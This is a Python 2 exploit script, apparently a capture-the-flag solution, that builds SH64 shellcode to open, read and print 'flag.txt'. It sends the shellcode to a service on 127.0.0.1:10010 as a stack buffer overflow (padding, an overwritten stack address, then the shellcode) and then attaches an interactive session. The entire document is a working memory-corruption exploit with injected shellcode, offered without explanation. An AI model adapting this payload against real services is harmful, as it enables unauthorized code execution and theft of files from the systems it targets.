START_MODE = 'sh'
if START_MODE == 'sh':
    asm = '''.section .text
.global _start
.ascii "%s"
_start:
    pt get_addr, tr0
    blink tr0, r18
    nop
ret:
open:
    fmov.qd r18,dr2
    fmov.dq dr2,r3
    xor r4, r4, r4
    xor r5, r5, r5
    movi	5, r2
    movi	34, r0
    trapa	r0
read:
    fmov.qd r2,dr2
    fmov.dq dr2,r3
    fmov.qd r18,dr2
    fmov.dq dr2,r4
    movi 0x7f, r5
    movi	3, r2
    movi	34, r0
    trapa	r0
write:
    movi 1, r3
    fmov.qd r18,dr2
    fmov.dq dr2,r4
    movi 0x7f, r5
    movi	4, r2
    movi	34, r0
    trapa	r0

get_addr:
    pt ret, tr5
    blink tr5, r18
# padding byte
.byte 0xff
.ascii "%s"
'''
    pass
else:
    asm = '''.section .text
.global _start
.ascii "%s"
_start:
'''
import os
from lib.mylib import *

ARCH = 'sh64'
# AS = ARCH + '-elf-as'
AS = ARCH + '-elf-gcc'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
# os.system(AS + ' /tmp/a.S -o /tmp/a.out')
os.system(AS + ' -s /tmp/a.S -o /tmp/a.out -fno-builtin -nostdinc -nostdlib -static -O -Wall -g -m5-64media ')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10010
s = mysock(IP, PORT)
s.send('\n000')
SP = 0x1ef0 + 1
shellcode = 'AAAAAAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
